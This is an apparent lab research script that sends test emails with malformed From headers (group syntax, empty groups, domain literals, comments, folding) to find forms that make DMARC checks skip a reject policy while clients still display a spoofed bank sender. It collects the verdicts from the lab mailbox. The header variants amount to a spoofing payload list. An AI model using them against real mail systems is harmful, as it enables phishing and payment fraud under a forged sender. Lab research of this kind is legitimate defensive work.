"""Campaign V: policy-void triggers - From forms that make DMARC evaluators
exit "none" while clients still render a sender.

ASCII-clean forms not covered by Chen 2020 A6-A8: group syntax, empty group,
domain-literal, CFWS after domain, obs-only From. Victim domain carries
p=reject so "policy consulted" is observable in the verdict and in the DNS log.
"""
from __future__ import annotations

import json
import subprocess
import sys
import time
from pathlib import Path

RUN = Path("/mnt/e/MailSecLab/received-lab/results/research/w2-20261002a")
STAGE = RUN / "void"
EVIDENCE = "/evidence/w2-20261002a/void"
VICTIM = "xn--mnchen-3ya.lab.test"

CASES = [
    {"name": "vc-plain-control", "from": f"From: Bank Security <security@{VICTIM}>"},
    {"name": "v1-group-single", "from": f"From: Bank Security: security@{VICTIM};"},
    {"name": "v2-group-empty", "from": "From: Bank Security:;"},
    {"name": "v3-domain-literal", "from": "From: Bank Security <security@[203.0.113.7]>"},
    {"name": "v4-comment-after-domain", "from": f"From: Bank Security <security@{VICTIM} (Bank)>"},
    {"name": "v5-folded-addr", "from": f"From: Bank Security\r\n <security@{VICTIM}>"},
    {"name": "v6-obs-only-from", "from": f"From : Bank Security <security@{VICTIM}>"},
    {"name": "v7-quoted-local", "from": f'From: Bank Security <"security"@{VICTIM}>'},
    {"name": "v8-group-two-domains", "from": f"From: Bank Security: security@{VICTIM}, agent@lab.test;"},
]


def sh(args, timeout=90):
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=False)
    return proc.returncode, proc.stdout.decode("utf-8", "replace"), proc.stderr.decode("utf-8", "replace")


def build(case_id: str, from_line: str) -> bytes:
    headers = [
        from_line.encode("utf-8"),
        b"To: bob@lab.test",
        b"Date: Fri, 2 Oct 2026 18:00:00 +0000",
        b"Subject: void trigger probe",
        f"Message-ID: <{case_id}@lab.test>".encode(),
        f"X-Case-ID: {case_id}".encode(),
    ]
    return b"\r\n".join(headers) + b"\r\n\r\nPlease confirm the payment.\r\nCase: " + case_id.encode() + b"\r\n"


FETCH_SCRIPT = r'''
import imaplib, json, sys
case = sys.argv[1]
m = imaplib.IMAP4("msl-dovecot", 143)
m.login("bob", "lab-bob")
m.select("INBOX", readonly=True)
typ, data = m.search(None, "ALL")
out = {"found": False}
for item in reversed(data[0].split()):
    typ, msg = m.fetch(item, "(BODY.PEEK[HEADER.FIELDS (X-CASE-ID)])")
    blob = (msg[0][1] or b"") if msg and msg[0] else b""
    if case.encode() not in blob:
        continue
    typ, env = m.fetch(item, "(ENVELOPE)")
    typ, full = m.fetch(item, "(BODY.PEEK[])")
    raw = full[0][1]
    open(f"/evidence/w2-20261002a/void/{case}.stored.eml", "wb").write(raw)
    ars = [l.decode("utf-8", "replace").strip()[:150] for l in raw.split(b"\r\n") if b"Authentication-Results" in l]
    out = {"found": True, "uid": item.decode(), "ar": ars, "envelope": repr(env[0])[60:420]}
    break
m.logout()
print(json.dumps(out))
'''


def fetch_stored(case_id: str, tries: int = 8, delay: float = 3.0):
    last = {"found": False}
    for _ in range(tries):
        proc = subprocess.run(["docker", "exec", "-i", "msl-client", "python3", "-", case_id],
                              input=FETCH_SCRIPT.encode(), stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE, timeout=60, check=False)
        try:
            last = json.loads(proc.stdout.decode())
        except json.JSONDecodeError:
            last = {"found": False}
        if last.get("found"):
            return last
        time.sleep(delay)
    return last


def main() -> None:
    STAGE.mkdir(parents=True, exist_ok=True)
    rows = []
    for case in CASES:
        name = case["name"]
        case_id = "void-" + name
        raw = build(case_id, case["from"])
        (STAGE / f"{name}.eml").write_bytes(raw)
        t_send = time.strftime("%H:%M:%S")
        code, out, err = sh([
            "docker", "exec", "msl-client", "python3", "/opt/research/lib/smtp_send.py",
            "--server", "msl-auth-postfix", "--port", "25",
            "--mail-from", "alice@lab.test", "--rcpt-to", "bob@lab.test",
            "--input", f"{EVIDENCE}/{name}.eml",
            "--transcript", f"{EVIDENCE}/{name}.smtp.txt",
        ], timeout=90)
        try:
            sent = json.loads(out)
        except json.JSONDecodeError:
            sent = {"accepted": False, "raw": (out or err)[-200:]}
        stored = fetch_stored(case_id) if sent.get("accepted") else {"found": False}
        row = {
            "case": name,
            "from_line": case["from"].replace("\r\n", "\\r\\n"),
            "t_send": t_send,
            "smtp": sent.get("reply"),
            "delivered": stored.get("found"),
            "ar": stored.get("ar", []),
            "envelope": stored.get("envelope", "")[:220],
        }
        write = STAGE / f"{name}.json"
        write.write_text(json.dumps({"row": row, "smtp": sent, "stored": stored}, ensure_ascii=False, indent=1), encoding="utf-8")
        rows.append(row)
        print(json.dumps({"case": name, "smtp": (row["smtp"] or "")[:40], "ar": [a[:80] for a in row["ar"]]}, ensure_ascii=False), flush=True)
        time.sleep(3)
    (STAGE / "cases.json").write_text(json.dumps({"rows": rows}, ensure_ascii=False, indent=1), encoding="utf-8")


if __name__ == "__main__":
    main()
